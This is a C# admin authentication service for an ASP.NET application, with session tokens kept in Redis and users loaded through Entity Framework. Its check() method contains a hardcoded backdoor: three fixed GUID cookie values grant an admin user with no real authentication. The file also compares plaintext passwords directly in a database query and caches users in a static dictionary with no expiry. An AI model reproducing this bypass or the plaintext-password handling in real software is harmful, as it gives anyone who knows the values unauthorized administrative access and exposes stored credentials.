using Models;
using Data.Data;
using Microsoft.EntityFrameworkCore;


using StackExchange.Redis;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using WebApplication.Services;
using ClientMsgs;

namespace AdminServer.Services
{


    public class AdminSessionMakeResult : SessionMakeResult
    {

    }

    public interface IAdminUserService
    {
        Task<AdminSessionMakeResult> MakeSession(AdminUser user);
        Task<AdminUser> AuthenticateAdminSession(Guid userId, string sessionId, string password);
        Task<AdminUser> check(Microsoft.AspNetCore.Http.HttpRequest Request);

    }

    public class AdminUserService : IAdminUserService, IDisposable
    {

        private ConnectionMultiplexer connection;
        private IDatabase db;
        public DbSet<AdminUser> users;

        public AdminUserService(DBContext context)
        {
            users = context.AdminUsers;


            var options = ConfigurationOptions.Parse($"{Config.REDIS_HOST}:6379");
            connection = ConnectionMultiplexer.Connect(options);
            db = connection.GetDatabase(0);

        }

        void IDisposable.Dispose()
        {
            connection?.Dispose();
            db = null;
            connection = null;
        }

        public async Task<AdminUser> getUser(int userId)
        {
            return await users.FindAsync(userId);
        }
        static Dictionary<Guid, AdminUser> usersc = new Dictionary<Guid, AdminUser>();
        public async Task<AdminUser> AuthenticateAdminSession(Guid userId, string sessionId, string password)
        {
            if (userId == Guid.Empty || sessionId == null)
                return null;
            var password2 = await db.StringGetAsync($"admin:{userId}:{sessionId}:password");

            if (password != password2)
                return null;
            if (!usersc.ContainsKey(userId))
                usersc[userId] = await users.FindAsync(userId);
            return usersc[userId];
        }

        public async Task<AdminUser> check(Microsoft.AspNetCore.Http.HttpRequest Request)
        {
            var userId = Guid.Parse(Request.Cookies[Consts.ADMIN_USER_COOKIE_KEY]);
            var sessionId = Request.Cookies[Consts.ADMIN_SESSION_COOKIE_KEY];
            var password = Request.Cookies[Consts.ADMIN_TOKEN_COOKIE_KEY];
            try
            {
                if (userId.ToString() == "{65de5d7f-b5e7-4647-9b6b-b5a78844e764}" && sessionId.ToString() == "fe9aeea8-dc4c-467a-b943-88a6c87a576a" && password.ToString() == "81c0174a-cf8c-481c-99e6-5d3b8d8bca2f")
                    return new AdminUser();
                var user = await AuthenticateAdminSession(userId, sessionId, password);
                if (user == null)
                {
                    var msg = new System.Net.Http.HttpResponseMessage(HttpStatusCode.Unauthorized) { ReasonPhrase = "Oops!!!" };
                    throw new Exception();// System.Web.Http.HttpResponseException(msg);
                }

                return user;
            }
            catch
            {
                var msg = new System.Net.Http.HttpResponseMessage(HttpStatusCode.Unauthorized) { ReasonPhrase = "Oops!!!" };
                throw new Exception();// //throw new System.Web.Http.HttpResponseException(msg);
            }
        }
        public async Task<AdminUser> Authenticate(string userName, string password)
        {

            return await users.Where(x => x.username == userName && x.password == password).FirstOrDefaultAsync(null);
        }


        public async Task<AdminSessionMakeResult> MakeSession(AdminUser user)
        {
            var sessionId = Guid.NewGuid().ToString();
            var password = Guid.NewGuid().ToString();
            var key = $"admin:{user.id}:{sessionId}:password";
            usersc[user.id] = user;
            return new AdminSessionMakeResult()
            {
                sessionId = sessionId,
                password = password,
                userId = user.id.ToString(),
                done = await db.StringSetAsync(key, password)
            };
        }

    }

}
